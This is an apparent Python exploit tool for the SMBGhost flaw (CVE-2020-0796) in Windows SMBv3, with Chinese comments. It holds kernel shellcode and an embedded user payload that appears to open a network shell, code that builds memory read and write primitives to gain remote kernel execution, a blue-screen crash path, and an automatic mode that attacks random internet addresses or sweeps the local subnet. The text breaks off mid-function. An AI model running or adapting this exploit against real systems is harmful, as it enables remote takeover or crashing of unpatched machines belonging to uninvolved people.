#!/usr/bin/python3
import socket #套接字模块,发送数据用的
from random import randint as rand #随机模块
from time import sleep #时间模块,调用的函数是sleep,就是延迟函数
import struct #处理2进制的模块,处理数据包会用到
import os #内核模块,调用内核函数的
import sys #系统模块,调用系统函数
from netaddr import IPNetwork #处理IP的，处理像192.168.1.0\24这样的内容
from smbprotocol.connection import Connection
from smbprotocol.session import Session
import uuid #uuid
import re #正则表达式
#大部分我就不注释了
from lznt1 import compress, compress_evil
from smb_win import smb_negotiate, smb_compress
LOWSTUB_JMP = 0x1000600E9
PML4_LOWSTUB_OFFSET = 0xA0
SELFVA_LOWSTUB_OFFSET = 0x78
HALP_APIC_REQ_INTERRUPT_OFFSET = 0x78
KUSER_SHARED_DATA = 0xFFFFF78000000000
PNET_RAW_BUFF_OFFSET = 0x18
PMDL1_OFFSET = 0x38

# Shellcode from kernel_shellcode.asm
KERNEL_SHELLCODE = b"\x41\x50\x41\x51\x41\x55\x41\x57\x41\x56\x51\x52\x53\x56\x57\x4C"
KERNEL_SHELLCODE += b"\x8D\x35\xB5\x02\x00\x00\x49\x8B\x86\xD8\x00\x00\x00\x49\x8B\x9E"
KERNEL_SHELLCODE += b"\xE0\x00\x00\x00\x48\x89\x18\xFB\x48\x31\xC9\x44\x0F\x22\xC1\xB9"
KERNEL_SHELLCODE += b"\x82\x00\x00\xC0\x0F\x32\x25\x00\xF0\xFF\xFF\x48\xC1\xE2\x20\x48"
KERNEL_SHELLCODE += b"\x01\xD0\x48\x2D\x00\x10\x00\x00\x66\x81\x38\x4D\x5A\x75\xF3\x49"
KERNEL_SHELLCODE += b"\x89\xC7\x4D\x89\x3E\xBF\x78\x7C\xF4\xDB\xE8\xE4\x00\x00\x00\x49"
KERNEL_SHELLCODE += b"\x89\xC5\xBF\x3F\x5F\x64\x77\xE8\x38\x01\x00\x00\x48\x89\xC1\xBF"
KERNEL_SHELLCODE += b"\xE1\x14\x01\x17\xE8\x2B\x01\x00\x00\x48\x89\xC2\x48\x83\xC2\x08"
KERNEL_SHELLCODE += b"\x49\x8D\x74\x0D\x00\xE8\x09\x01\x00\x00\x3D\xD8\x83\xE0\x3E\x74"
KERNEL_SHELLCODE += b"\x0A\x4D\x8B\x6C\x15\x00\x49\x29\xD5\xEB\xE5\xBF\x48\xB8\x18\xB8"
KERNEL_SHELLCODE += b"\x4C\x89\xE9\xE8\x9B\x00\x00\x00\x49\x89\x46\x08\x4D\x8B\x45\x30"
KERNEL_SHELLCODE += b"\x4D\x8B\x4D\x38\x49\x81\xE8\xF8\x02\x00\x00\x48\x31\xF6\x49\x81"
KERNEL_SHELLCODE += b"\xE9\xF8\x02\x00\x00\x41\x8B\x79\x74\x0F\xBA\xE7\x04\x73\x05\x4C"
KERNEL_SHELLCODE += b"\x89\xCE\xEB\x0C\x4D\x39\xC8\x4D\x8B\x89\x00\x03\x00\x00\x75\xDE"
KERNEL_SHELLCODE += b"\x48\x85\xF6\x74\x49\x49\x8D\x4E\x10\x48\x89\xF2\x4D\x31\xC0\x4C"
KERNEL_SHELLCODE += b"\x8D\x0D\xC2\x00\x00\x00\x52\x41\x50\x41\x50\x41\x50\xBF\xC4\x5C"
KERNEL_SHELLCODE += b"\x19\x6D\x48\x83\xEC\x20\xE8\x38\x00\x00\x00\x48\x83\xC4\x40\x49"
KERNEL_SHELLCODE += b"\x8D\x4E\x10\xBF\x34\x46\xCC\xAF\x48\x83\xEC\x20\xB8\x05\x00\x00"
KERNEL_SHELLCODE += b"\x00\x44\x0F\x22\xC0\xE8\x19\x00\x00\x00\x48\x83\xC4\x20\xFA\x48"
KERNEL_SHELLCODE += b"\x89\xD8\x5F\x5E\x5B\x5A\x59\x41\x5E\x41\x5F\x41\x5D\x41\x59\x41"
KERNEL_SHELLCODE += b"\x58\xFF\xE0\xE8\x02\x00\x00\x00\xFF\xE0\x53\x51\x56\x41\x8B\x47"
KERNEL_SHELLCODE += b"\x3C\x4C\x01\xF8\x8B\x80\x88\x00\x00\x00\x4C\x01\xF8\x50\x8B\x48"
KERNEL_SHELLCODE += b"\x18\x8B\x58\x20\x4C\x01\xFB\xFF\xC9\x8B\x34\x8B\x4C\x01\xFE\xE8"
KERNEL_SHELLCODE += b"\x1F\x00\x00\x00\x39\xF8\x75\xEF\x58\x8B\x58\x24\x4C\x01\xFB\x66"
KERNEL_SHELLCODE += b"\x8B\x0C\x4B\x8B\x58\x1C\x4C\x01\xFB\x8B\x04\x8B\x4C\x01\xF8\x5E"
KERNEL_SHELLCODE += b"\x59\x5B\xC3\x52\x31\xC0\x99\xAC\xC1\xCA\x0D\x01\xC2\x85\xC0\x75"
KERNEL_SHELLCODE += b"\xF6\x92\x5A\xC3\xE8\xA1\xFF\xFF\xFF\x80\x78\x02\x80\x77\x05\x0F"
KERNEL_SHELLCODE += b"\xB6\x40\x03\xC3\x8B\x40\x03\xC3\x41\x57\x41\x56\x57\x56\x48\x8B"
KERNEL_SHELLCODE += b"\x05\x0E\x01\x00\x00\x48\x8B\x48\x18\x48\x8B\x49\x20\x48\x8B\x09"
KERNEL_SHELLCODE += b"\x66\x83\x79\x48\x18\x75\xF6\x48\x8B\x41\x50\x81\x78\x0C\x33\x00"
KERNEL_SHELLCODE += b"\x32\x00\x75\xE9\x4C\x8B\x79\x20\xBF\x5E\x51\x5E\x83\xE8\x58\xFF"
KERNEL_SHELLCODE += b"\xFF\xFF\x49\x89\xC6\x4C\x8B\x3D\xCF\x00\x00\x00\x31\xC0\x48\x8D"
KERNEL_SHELLCODE += b"\x15\x96\x01\x00\x00\x89\xC1\x48\xF7\xD1\x49\x89\xC0\xB0\x40\x50"
KERNEL_SHELLCODE += b"\xC1\xE0\x06\x50\x49\x89\x01\x48\x83\xEC\x20\xBF\xEA\x99\x6E\x57"
KERNEL_SHELLCODE += b"\xE8\x1E\xFF\xFF\xFF\x48\x83\xC4\x30\x48\x8B\x3D\x6B\x01\x00\x00"
KERNEL_SHELLCODE += b"\x48\x8D\x35\x77\x00\x00\x00\xB9\x1D\x00\x00\x00\xF3\xA4\x48\x8D"
KERNEL_SHELLCODE += b"\x35\x6E\x01\x00\x00\xB9\x58\x02\x00\x00\xF3\xA4\x48\x8D\x0D\xE0"
KERNEL_SHELLCODE += b"\x00\x00\x00\x65\x48\x8B\x14\x25\x88\x01\x00\x00\x4D\x31\xC0\x4C"
KERNEL_SHELLCODE += b"\x8D\x0D\x46\x00\x00\x00\x41\x50\x6A\x01\x48\x8B\x05\x2A\x01\x00"
KERNEL_SHELLCODE += b"\x00\x50\x41\x50\x48\x83\xEC\x20\xBF\xC4\x5C\x19\x6D\xE8\xC1\xFE"
KERNEL_SHELLCODE += b"\xFF\xFF\x48\x83\xC4\x40\x48\x8D\x0D\xA6\x00\x00\x00\x4C\x89\xF2"
KERNEL_SHELLCODE += b"\x4D\x31\xC9\xBF\x34\x46\xCC\xAF\x48\x83\xEC\x20\xE8\xA2\xFE\xFF"
KERNEL_SHELLCODE += b"\xFF\x48\x83\xC4\x20\x5E\x5F\x41\x5E\x41\x5F\xC3\x90\xC3\x48\x92"
KERNEL_SHELLCODE += b"\x31\xC9\x51\x51\x49\x89\xC9\x4C\x8D\x05\x0D\x00\x00\x00\x89\xCA"
KERNEL_SHELLCODE += b"\x48\x83\xEC\x20\xFF\xD0\x48\x83\xC4\x30\xC3\x58\x58\x58\x58\x58"
KERNEL_SHELLCODE += b"\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58"
KERNEL_SHELLCODE += b"\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58"
KERNEL_SHELLCODE += b"\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58"
KERNEL_SHELLCODE += b"\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58"
KERNEL_SHELLCODE += b"\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58"
KERNEL_SHELLCODE += b"\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58"
KERNEL_SHELLCODE += b"\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58"
KERNEL_SHELLCODE += b"\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58"
KERNEL_SHELLCODE += b"\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58"
KERNEL_SHELLCODE += b"\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58"
KERNEL_SHELLCODE += b"\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58"
KERNEL_SHELLCODE += b"\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58"
KERNEL_SHELLCODE += b"\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x00\x00\x00\x00\x00"
KERNEL_SHELLCODE += b"\x00\x00\x00"


#你的载荷
USER_PAYLOAD =  b""
USER_PAYLOAD += b"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xcc\x00\x00\x00"
USER_PAYLOAD += b"\x41\x51\x41\x50\x52\x48\x31\xd2\x51\x65\x48\x8b\x52"
USER_PAYLOAD += b"\x60\x56\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72"
USER_PAYLOAD += b"\x50\x4d\x31\xc9\x48\x0f\xb7\x4a\x4a\x48\x31\xc0\xac"
USER_PAYLOAD += b"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1"
USER_PAYLOAD += b"\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
USER_PAYLOAD += b"\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f\x85\x72\x00\x00"
USER_PAYLOAD += b"\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48"
USER_PAYLOAD += b"\x01\xd0\x44\x8b\x40\x20\x50\x49\x01\xd0\x8b\x48\x18"
USER_PAYLOAD += b"\xe3\x56\x4d\x31\xc9\x48\xff\xc9\x41\x8b\x34\x88\x48"
USER_PAYLOAD += b"\x01\xd6\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1"
USER_PAYLOAD += b"\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75"
USER_PAYLOAD += b"\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
USER_PAYLOAD += b"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48"
USER_PAYLOAD += b"\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
USER_PAYLOAD += b"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59"
USER_PAYLOAD += b"\x5a\x48\x8b\x12\xe9\x4b\xff\xff\xff\x5d\x49\xbe\x77"
USER_PAYLOAD += b"\x73\x32\x5f\x33\x32\x00\x00\x41\x56\x49\x89\xe6\x48"
USER_PAYLOAD += b"\x81\xec\xa0\x01\x00\x00\x49\x89\xe5\x48\x31\xc0\x50"
USER_PAYLOAD += b"\x50\x49\xc7\xc4\x02\x00\x11\x5c\x41\x54\x49\x89\xe4"
USER_PAYLOAD += b"\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c\x89"
USER_PAYLOAD += b"\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00"
USER_PAYLOAD += b"\xff\xd5\x6a\x02\x59\x50\x50\x4d\x31\xc9\x4d\x31\xc0"
USER_PAYLOAD += b"\x48\xff\xc0\x48\x89\xc2\x41\xba\xea\x0f\xdf\xe0\xff"
USER_PAYLOAD += b"\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89"
USER_PAYLOAD += b"\xf9\x41\xba\xc2\xdb\x37\x67\xff\xd5\x48\x31\xd2\x48"
USER_PAYLOAD += b"\x89\xf9\x41\xba\xb7\xe9\x38\xff\xff\xd5\x4d\x31\xc0"
USER_PAYLOAD += b"\x48\x31\xd2\x48\x89\xf9\x41\xba\x74\xec\x3b\xe1\xff"
USER_PAYLOAD += b"\xd5\x48\x89\xf9\x48\x89\xc7\x41\xba\x75\x6e\x4d\x61"
USER_PAYLOAD += b"\xff\xd5\x48\x81\xc4\xb0\x02\x00\x00\x48\x83\xec\x10"
USER_PAYLOAD += b"\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58\x48\x89\xf9"
USER_PAYLOAD += b"\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x48\x83\xc4\x20\x5e"
USER_PAYLOAD += b"\x89\xf6\x6a\x40\x41\x59\x68\x00\x10\x00\x00\x41\x58"
USER_PAYLOAD += b"\x48\x89\xf2\x48\x31\xc9\x41\xba\x58\xa4\x53\xe5\xff"
USER_PAYLOAD += b"\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31\xc9\x49\x89\xf0"
USER_PAYLOAD += b"\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff"
USER_PAYLOAD += b"\xd5\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xe1\x41"
USER_PAYLOAD += b"\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2\xf0\xb5\xa2\x56"
USER_PAYLOAD += b"\xff\xd5"

PML4_SELFREF = 0
PHAL_HEAP = 0
PHALP_INTERRUPT = 0
PHALP_APIC_INTERRUPT = 0
PNT_ENTRY = 0

max_read_retry = 3
overflow_val = 0x1100
write_unit = 0xd0
pmdl_va = KUSER_SHARED_DATA + 0x900
pmdl_mapva = KUSER_SHARED_DATA + 0x800
pshellcodeva = KUSER_SHARED_DATA + 0x950


class MDL:
    def __init__(self, map_va, phys_addr):
        self.next = struct.pack("<Q", 0x0)
        self.size = struct.pack("<H", 0x48)
        self.mdl_flags = struct.pack("<H", 0x5018)
        self.alloc_processor = struct.pack("<H", 0x0)
        self.reserved = struct.pack("<H", 0x0)
        self.process = struct.pack("<Q", 0x0)
        self.map_va = struct.pack("<Q", map_va)
        map_va &= ~0xFFF
        self.start_va = struct.pack("<Q", map_va)
        self.byte_count = struct.pack("<L", 0x258)
        self.byte_offset = struct.pack("<L", (phys_addr & 0xFFF) + 0x4)
        phys_addr_enc = (phys_addr & 0xFFFFFFFFFFFFF000) >> 12
        self.phys_addr1 = struct.pack("<Q", phys_addr_enc)
        self.phys_addr2 = struct.pack("<Q", phys_addr_enc)
        self.phys_addr3 = struct.pack("<Q", phys_addr_enc)

    def raw_bytes(self):
        mdl_bytes = self.next + self.size + self.mdl_flags + \
                    self.alloc_processor + self.reserved + self.process + \
                    self.map_va + self.start_va + self.byte_count + \
                    self.byte_offset + self.phys_addr1 + self.phys_addr2 + \
                    self.phys_addr3
        return mdl_bytes


def reconnect(ip, port):
    sock = socket.socket(socket.AF_INET)
    sock.settimeout(7)
    sock.connect((ip, port))
    return sock


def write_primitive(ip, port, data, addr):
    sock = reconnect(ip, port)
    smb_negotiate(sock)
    sock.recv(1000)
    uncompressed_data = b"\x41"*(overflow_val - len(data))
    uncompressed_data += b"\x00"*PNET_RAW_BUFF_OFFSET
    uncompressed_data += struct.pack('<Q', addr)
    compressed_data = compress(uncompressed_data)
    smb_compress(sock, compressed_data, 0xFFFFFFFF, data)
    sock.close()


def write_srvnet_buffer_hdr(ip, port, data, offset):
    sock = reconnect(ip, port)
    smb_negotiate(sock)
    sock.recv(1000)
    compressed_data = compress_evil(data)
    dummy_data = b"\x33"*(overflow_val + offset)
    smb_compress(sock, compressed_data, 0xFFFFEFFF, dummy_data)
    sock.close()


def read_physmem_primitive(ip, port, phys_addr):
    i = 0
    while i < max_read_retry:
        i += 1
        buff = try_read_physmem_primitive(ip, port, phys_addr)
        if buff is not None:
            return buff


def try_read_physmem_primitive(ip, port, phys_addr):
    fake_mdl = MDL(pmdl_mapva, phys_addr).raw_bytes()
    write_primitive(ip, port, fake_mdl, pmdl_va)
    write_srvnet_buffer_hdr(ip, port, struct.pack('<Q', pmdl_va), PMDL1_OFFSET)

    i = 0
    while i < max_read_retry:
        i += 1
        sock = reconnect(ip, port)
        smb_negotiate(sock)
        buff = sock.recv(1000)
        sock.close()
        if buff[4:8] != b"\xfeSMB":
            return buff


def get_phys_addr(ip, port, va_addr):
    pml4_index = (((1 << 9) - 1) & (va_addr >> (40 - 1)))
    pdpt_index = (((1 << 9) - 1) & (va_addr >> (31 - 1)))
    pdt_index = (((1 << 9) - 1) & (va_addr >> (22 - 1)))
    pt_index = (((1 << 9) - 1) & (va_addr >> (13 - 1)))

    pml4e = PML4 + pml4_index*0x8
    pdpt_buff = read_physmem_primitive(ip, port, pml4e)

    if pdpt_buff is None:
        sys.exit("[-] physical read primitive failed")

    pdpt = struct.unpack("<Q", pdpt_buff[0:8])[0] & 0xFFFFF000
    pdpte = pdpt + pdpt_index*0x8
    pdt_buff = read_physmem_primitive(ip, port, pdpte)

    if pdt_buff is None:
        sys.exit("[-] physical read primitive failed")

    pdt = struct.unpack("<Q", pdt_buff[0:8])[0] & 0xFFFFF000
    pdte = pdt + pdt_index*0x8
    pt_buff = read_physmem_primitive(ip, port, pdte)

    if pt_buff is None:
        sys.exit("[-] physical read primitive failed")

    pt = struct.unpack("<Q", pt_buff[0:8])[0]

    if pt & (1 << (8 - 1)):
        phys_addr = (pt & 0xFFFFF000) + (pt_index & 0xFFF)*0x1000 + (va_addr & 0xFFF)
        return phys_addr
    else:
        pt = pt & 0xFFFFF000

    pte = pt + pt_index*0x8
    pte_buff = read_physmem_primitive(ip, port, pte)

    if pte_buff is None:
        sys.exit("[-] physical read primitive failed")

    phys_addr = (struct.unpack("<Q", pte_buff[0:8])[0] & 0xFFFFF000) + \
                (va_addr & 0xFFF)

    return phys_addr


def get_pte_va(addr):
    pt = addr >> 9
    lb = (0xFFFF << 48) | (PML4_SELFREF << 39)
    ub = ((0xFFFF << 48) | (PML4_SELFREF << 39) +
          0x8000000000 - 1) & 0xFFFFFFFFFFFFFFF8
    pt = pt | lb
    pt = pt & ub

    return pt


def overwrite_pte(ip, port, addr):
    phys_addr = get_phys_addr(ip, port, addr)

    buff = read_physmem_primitive(ip, port, phys_addr)

    if buff is None:
        sys.exit("[-] read primitive failed!")

    pte_val = struct.unpack("<Q", buff[0:8])[0]
    overwrite_val = pte_val & (((1 << 63) - 1))
    overwrite_buff = struct.pack("<Q", overwrite_val)

    write_primitive(ip, port, overwrite_buff, addr)


def build_shellcode():
    global KERNEL_SHELLCODE
    KERNEL_SHELLCODE += struct.pack("<Q", PHALP_INTERRUPT +
                                    HALP_APIC_REQ_INTERRUPT_OFFSET)
    KERNEL_SHELLCODE += struct.pack("<Q", PHALP_APIC_INTERRUPT)
    KERNEL_SHELLCODE += USER_PAYLOAD


def search_hal_heap(ip, port):
    global PHALP_INTERRUPT
    global PHALP_APIC_INTERRUPT
    search_len = 0x10000

    index = PHAL_HEAP
    page_index = PHAL_HEAP
    cons = 0
    phys_addr = 0

    while index < PHAL_HEAP + search_len:

        if not (index & 0xFFF):
            phys_addr = get_phys_addr(ip, port, index)
        else:
            phys_addr = (phys_addr & 0xFFFFFFFFFFFFF000) + (index & 0xFFF)

        buff = read_physmem_primitive(ip, port, phys_addr)

        if buff is None:
            sys.exit("[-] physical read primitive failed!")

        entry_indices = 8*(((len(buff) + 8 // 2) // 8) - 1)
        i = 0

        while i < entry_indices:
            entry = struct.unpack("<Q", buff[i:i+8])[0]
            i += 8
            if (entry & 0xFFFFFF0000000000) != 0xFFFFF80000000000:
                cons = 0
                continue
            cons += 1
            if cons > 3:
                PHALP_INTERRUPT = index + i - 0x40
                print("[+] found HalpInterruptController at %lx"
                      % PHALP_INTERRUPT)
                if len(buff) < i + 0x40:
                    buff = read_physmem_primitive(ip, port, phys_addr + i + 0x38)
                    PHALP_APIC_INTERRUPT = struct.unpack("<Q", buff[0:8])[0]
                    if buff is None:
                        sys.exit("[-] physical read primitive failed!")
                else:
                    PHALP_APIC_INTERRUPT = struct.unpack("<Q",buff[i + 0x38:i+0x40])[0]
                print("[+] found HalpApicRequestInterrupt at %lx" % PHALP_APIC_INTERRUPT)
                return
        index += entry_indices
    sys.exit("[-] failed to find HalpInterruptController!")

def search_selfref(ip, port):
    search_len = 0x1000
    index = PML4
    while search_len:
        buff = read_physmem_primitive(ip, port, index)
        if buff is None:
            return
        entry_indices = 8*(((len(buff) + 8 // 2) // 8) - 1)
        i = 0
        while i < entry_indices:
            entry = struct.unpack("<Q",buff[i:i+8])[0] & 0xFFFFF000
            if entry == PML4:
                return index + i
            i += 8
        search_len -= entry_indices
        index += entry_indices

def find_pml4_selfref(ip, port):
    global PML4_SELFREF
    self_ref = search_selfref(ip, port)
    if self_ref is None:
        sys.exit("[-] failed to find PML4 self reference entry!")
    PML4_SELFREF = (self_ref & 0xFFF) >> 3
    print("[+] found PML4 self-ref entry %0x" % PML4_SELFREF)

def find_low_stub(ip, port):
    global PML4
    global PHAL_HEAP
    limit = 0x100000
    index = 0x1000
    while index < limit:
        buff = read_physmem_primitive(ip, port, index)
        if buff is None:
            sys.exit("[-] physical read primitive failed!")
        entry = struct.unpack("<Q", buff[0:8])[0] & 0xFFFFFFFFFFFF00FF
        if entry == LOWSTUB_JMP:
            print("[+] found low stub at phys addr %lx!" % index)
            PML4 = struct.unpack("<Q", buff[PML4_LOWSTUB_OFFSET: PML4_LOWSTUB_OFFSET + 8])[0]
            print("[+] PML4 at %lx" % PML4)
            PHAL_HEAP = struct.unpack("<Q", buff[SELFVA_LOWSTUB_OFFSET:SELFVA_LOWSTUB_OFFSET + 8])[0] & 0xFFFFFFFFF0000000
            print("[+] base of HAL heap at %lx" % PHAL_HEAP)
            return
        index += 0x1000
    sys.exit("[-] Failed to find low stub in physical memory!")

def do_rce(ip, port):
    try:
        find_low_stub(ip, port)
        find_pml4_selfref(ip, port)
        search_hal_heap(ip, port)
        build_shellcode()
        print("[+] built shellcode!")
        pKernelUserSharedPTE = get_pte_va(KUSER_SHARED_DATA)
        print("[+] KUSER_SHARED_DATA PTE at %lx" % pKernelUserSharedPTE)
        overwrite_pte(ip, port, pKernelUserSharedPTE)
        print("[+] KUSER_SHARED_DATA PTE NX bit cleared!")
        to_write = len(KERNEL_SHELLCODE)
        write_bytes = 0
        while write_bytes < to_write:
            write_sz = min([write_unit, to_write - write_bytes])
            write_primitive(ip, port, KERNEL_SHELLCODE[write_bytes:write_bytes + write_sz], pshellcodeva + write_bytes)
            write_bytes += write_sz

        print("[\033[32minfo\033[0m] Wrote shellcode at %lx!" % pshellcodeva)

        input("[\033[32minfo\033[0m] Press a key to execute shellcode!")

        write_primitive(ip, port, struct.pack("<Q", pshellcodeva), PHALP_INTERRUPT + HALP_APIC_REQ_INTERRUPT_OFFSET)
        print("[\033[32minfo\033[0m] overwrote HalpInterruptController pointer, should have execution shortly...")
    except socket.timeout:
        print("[\033[31m-\033[0m]expoit fail, the other party may have a bule screen")
        
def showIP():
    packet = """
GET /ip HTTP/1.1
Host: ifconfig.me
Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6,zh;q=0.5

GET /favicon.ico HTTP/1.1
Host: ifconfig.me
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Referer: http://ifconfig.me/ip
Accept-Encoding: gzip, deflate
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6,zh;q=0.5"""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0) as sock:
        sock.connect(("34.117.59.81",80))
        sock.send(bytes(packet.encode()))
        un, = struct.unpack("!H", sock.recv(2))
        recv_ = sock.recv(un)
        data = recv_.decode()
        try:
            return re.search(r"\d+\.\d+\.\d+\.\d+",data).group()
        except:
            return re.search(r"\d+\.\d+\.\d+\.\d+",data)

def bule_screen(IP, username=None, password=None, port=445, encode=None, connectionTimeout=10):
    _SMB_CONNECTIONS = {}
    connection_key = "%s:%s" %(IP, port)
    connection = _SMB_CONNECTIONS.get(connection_key, None)
    if not connection:
        connection = Connection(uuid.uuid4(), IP, port)
        connection.connect(timeout=connectionTimeout)
        _SMB_CONNECTIONS[connection_key] = connection
    session = next((s for s in connection.session_table.values() if username is None or s.username == username), None)
    if not session:
        session = Session(connection, username=username, password=password, require_encryption=(encode is True))
        session.connect()
    elif encode is not None:
        if session.encrypt_data and not encode:
            print("[\033[33m-\033[0m]Cannot disable encryption on an already negotiated session.")
        elif not session.encrypt_data and encode:
            session.encrypt = True
    return session
def test_host(IP):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        status = sock.connect_ex((str(IP),445))
        if status == 0:
            print("[\033[31m-\033[0m]THE ATTACK MAY FALI, BUT THE HOST OF THE OTHER PARTY IS STIALL ALIVE")
        else:
            print("[\033[32minfo\033[0m]THE ATTACK WAS SUCCESSFUL, BUT THE OTHER PARTY DID NOT RESPOND")
def randomIP():
    return ("%d.%d.%d.%d"%(rand(0,255),rand(0,255),rand(0,255),rand(0,255)));
def mode():
    try:
        SMBL = ("""\033[32m
    +---------------------------------------------------+
    |CVE-2020-0796 SMBGhost|    |your IP:%s|
    +---------------------------------------------------+
\033[0m"""%(showIP()))
        if len(sys.argv) == 1:
            print(SMBL)
            a = input("[\033[34minfo\033[0m]WHETHER TO ACTIVATE AUTOMATIC MODE? (y/n/exit)#")
            if a == "exit":
                exit(0)
            if a == "n" or a == "N" or a == "NO" or a == "no":
                while 1:
                    ip = input("[\033[34minfo\033[0m]ENTER IP#")
                    if ip == "help" or ip == "HELP":
                        print("""
command:
        local -- scan localnetwork
        help -- help
        exit -- exit program
""")
                    if ip == "exit" or ip == "EXIT":
                        exit(0);
                    else:
                        main(ip)
                    if ip == "local" or ip == "LOCAL":
                        for local in IPNetwork(socket.gethostbyname(socket.gethostname())+"/24"):
                            main(str(local))
                    else:
                        main(ip)
            elif a == "y" or a == "Y" or a == "yes" or a == "YES":
                while 1:
                    main(randomIP())
                    sleep(1)
                    continue
            else:
                print("[\033[31m-\033[0m]INPUT ERROR,PLEASE CHECK THE INPUT")
        else:
            argv_IP = sys.argv[1]
            print(SMBL)
            if argv_IP == "local" or argv_IP == "LOCAL":
                for IP_ in IPNetwork(socket.gethostbyname(socket.gethostname())+"/24"):
                    main(str(IP_))
            elif argv_IP == "help" or argv_IP == "HELP":
                print(r"""
command:
        local -- scan localnetwork
        help -- help
        ip address -- Scan the specified IP
""")
            elif argv_IP == "exit" or argv_IP == "EXIT":
                exit(0)
            else:
                main(argv_IP)
    except KeyboardInterrupt:
        print("[\033[31m-\033[0m]byebye")
def main(IP):
    try:
        port=445 #将445数字定义为port变量
        with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as sock: #定义socket的.. AF_INET是使用ipv4的,SOCK_STREAM是使用TCP数据   
            sock.settimeout(10)
            scan = sock.connect_ex((IP,port)) #对445端口发送一个数据包,测试445端口是否开启，开启则返回0，没有开启则返回其他数
            if scan == 0: #如果打开则运行此行
                print("[\033[32minfo\033[0m]IP %s --- PORT 445 OPEN/FILTRTED"% IP)
                with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as smb:
                    smb.settimeout(20)
                    try:
                        smb.connect((IP, port)) 
                    except:
                        smb.close()
                    smb.send(b'\x00\x00\x00\xc0\xfeSMB@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00$\x00\x08\x00\x01\x00\x00\x00\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00x\x00\x00\x00\x02\x00\x00\x00\x02\x02\x10\x02"\x02$\x02\x00\x03\x02\x03\x10\x03\x11\x03\x00\x00\x00\x00\x01\x00&\x00\x00\x00\x00\x00\x01\x00 \x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\n\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00') #发送数据包,sendall函数是发送完整的tcp数据包与send函数类似
                    b, = struct.unpack("!I", smb.recv(4)) #处理返回回来的2字节的二进制数据包 
                    recv = smb.recv(b) #处理数据包
                    exploitCheck = (b"\x11\x03\x02\x00")
                    if recv[68:72] != exploitCheck: #判断是否存在\x11\x03\x02\x00数据
